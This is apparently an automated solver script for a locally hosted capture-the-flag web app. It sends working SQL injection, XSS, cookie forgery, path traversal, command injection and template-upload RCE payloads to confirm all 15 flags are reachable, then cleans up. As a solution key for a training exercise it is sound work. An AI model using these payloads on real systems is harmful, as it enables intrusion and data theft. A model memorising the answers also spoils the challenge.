// Automated solver: proves all 15 flags are actually reachable.
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { FLAGS, TOTAL_POINTS } from './flags.js'

const ROOT = path.dirname(fileURLToPath(import.meta.url))
const BASE = process.env.BASE_URL || 'http://localhost:7000'
const results = []

const check = (id, label, ok, detail = '') => {
  results.push({ id, ok, label, detail })
  console.log(`${ok ? 'PASS' : 'FAIL'} ${String(id).padStart(2, '0')} ${label}${detail ? ' :: ' + detail : ''}`)
}

const get = async (url, headers = {}) => {
  const res = await fetch(BASE + url, { headers })
  return { res, text: await res.text() }
}

const postJson = async (url, body, headers = {}) => {
  const res = await fetch(BASE + url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify(body)
  })
  return { res, text: await res.text() }
}

// Player account used by the submission checks.
const playerName = `verifier_${Date.now().toString(36)}`
const registered = await postJson('/api/player/register', { username: playerName, password: 'verify-pass-123' })
const playerCookie = (registered.res.headers.getSetCookie?.() || [])
  .map((c) => c.split('=')[0] + '=' + c.split('=')[1].split(';')[0]).join('; ')
const unauth = await postJson('/api/submit', { flag: FLAGS[0].flag })
check(16, 'submit requires login', unauth.res.status === 401 && playerCookie.includes('player_session='))

// 01 - client source comment
const clientHtml = fs.readFileSync(path.join(ROOT, '../client/index.html'), 'utf8')
check(1, 'HTML comment', clientHtml.includes(FLAGS[0].flag))

// 02 - robots.txt
const robots = await get('/robots.txt')
check(2, 'robots.txt', robots.text.includes(FLAGS[1].flag))

// 03 - auth bypass SQLi
const bypass = await postJson('/api/login', { username: "' OR '1'='1' -- ", password: 'x' })
const bypassCookie = (bypass.res.headers.getSetCookie?.() || []).map((c) => c.split('=')[0] + '=' + c.split('=')[1].split(';')[0]).join('; ')
const admin = await get('/admin', { Cookie: bypassCookie })
check(3, 'auth bypass', admin.text.includes(FLAGS[2].flag), admin.text.slice(0, 90))

// 04 - cookie role forgery
const normal = await postJson('/api/login', { username: 'varun', password: 'hunter2' })
const forged = 'role=admin; auth=1'
const member = await get('/member', { Cookie: forged })
check(4, 'cookie forgery', member.text.includes(FLAGS[3].flag) && !normal.text.includes(FLAGS[2].flag))

// 05 - IDOR
const user = await get('/api/users/2')
check(5, 'IDOR', user.text.includes(FLAGS[4].flag))

// 06 - error based SQLi
const err = await get('/api/search?q=' + encodeURIComponent("'"))
check(6, 'error SQLi', err.text.includes(FLAGS[5].flag))

// 07 - union based SQLi
const union = await get('/api/search?q=' + encodeURIComponent("' UNION SELECT id, flag, flag FROM secret_flags -- "))
check(7, 'union SQLi', union.text.includes(FLAGS[6].flag))

// 08 - boolean blind SQLi
const blind = await get('/api/item?id=' + encodeURIComponent("1 AND substr((SELECT flag FROM secret_flags WHERE id=8),1,1)='R'"))
check(8, 'boolean blind SQLi', blind.text.includes('"found":true'))

// 09 - stored XSS sink
const mainJsx = fs.readFileSync(path.join(ROOT, '../client/src/main.jsx'), 'utf8')
const posted = await postJson('/api/comments', { author: 'verifier', body: '<img src=x onerror="alert(1)">' })
const comments = await get('/api/comments')
check(9, 'stored XSS', mainJsx.includes(FLAGS[8].flag) && posted.text.includes('"ok":true') && comments.text.includes('<img src=x'))

// 10 - reflected XSS
const greet = await get('/greet?name=guest')
const greetCookies = (greet.res.headers.getSetCookie?.() || []).map((c) => decodeURIComponent(c)).join(' ')
check(10, 'reflected XSS', greetCookies.includes(FLAGS[9].flag))

// 11 - LFI
const lfi = await get('/page?page=' + encodeURIComponent('../../data/secrets/lfi_flag.txt'))
check(11, 'LFI', lfi.text.includes(FLAGS[10].flag))

// 12 - download traversal
const dl = await get('/download?file=' + encodeURIComponent('../secrets/download_flag.txt'))
check(12, 'download traversal', dl.text.includes(FLAGS[11].flag))

// 13 - command injection
const ping = await get('/api/ping?host=' + encodeURIComponent('127.0.0.1; cat data/secrets/cmd_flag.txt'))
check(13, 'command injection', ping.text.includes(FLAGS[12].flag), ping.text.slice(0, 100))

// 14 - upload + EJS render
const form = new FormData()
form.append('file', new Blob(['<%= process.env.CTF_FLAG_14 %>'], { type: 'text/plain' }), 'shell.ejs')
const upRes = await fetch(BASE + '/api/upload', { method: 'POST', body: form })
const upData = await upRes.json()
const rendered = await get('/render?view=' + encodeURIComponent(upData.filename || 'shell.ejs'))
check(14, 'upload + template RCE', rendered.text.includes(FLAGS[13].flag), rendered.text.slice(0, 80))

// 15 - backup chain
const backup = await get('/backup/db.js.bak')
const chain = await get('/api/search?q=' + encodeURIComponent("' UNION SELECT id, note, note FROM vault -- "))
check(15, 'backup + union chain', backup.text.includes('vault') && chain.text.includes(FLAGS[14].flag))

// authenticated checker
let allSubmitted = true
for (const f of FLAGS) {
  const r = await postJson('/api/submit', { flag: f.flag }, { Cookie: playerCookie })
  if (!r.text.includes('"status":"correct"')) allSubmitted = false
}
check(17, 'flag checker accepts all 15', allSubmitted)

const board = await get('/api/leaderboard')
const boardData = JSON.parse(board.text)
const myRow = boardData.rows.find((row) => row.username === playerName)
check(18, 'REST leaderboard reflects solves', !!myRow && myRow.solved === 15 && myRow.points === TOTAL_POINTS)

const stream = await fetch(`${BASE}/api/leaderboard/stream`)
const streamType = stream.headers.get('content-type') || ''
const reader = stream.body.getReader()
const first = await reader.read()
const firstChunk = new TextDecoder().decode(first.value || new Uint8Array())
await reader.cancel()
check(19, 'live leaderboard SSE stream', streamType.includes('text/event-stream') && firstChunk.includes(playerName))

// Remove artifacts created by this run so the event starts clean.
const { db } = await import('./db.js')
db.prepare("DELETE FROM comments WHERE author = 'verifier'").run()
const verifier = db.prepare('SELECT id FROM players WHERE username = ?').get(playerName)
if (verifier) {
  db.prepare('DELETE FROM player_submissions WHERE player_id = ?').run(verifier.id)
  db.prepare('DELETE FROM player_sessions WHERE player_id = ?').run(verifier.id)
  db.prepare('DELETE FROM players WHERE id = ?').run(verifier.id)
}
for (const name of fs.readdirSync(path.join(ROOT, 'uploads'))) {
  if (name === '.gitkeep') continue
  fs.rmSync(path.join(ROOT, 'uploads', name), { force: true })
}

const failed = results.filter((r) => !r.ok)
console.log(`\n${results.length - failed.length}/${results.length} checks passed`)
process.exit(failed.length ? 1 : 0)
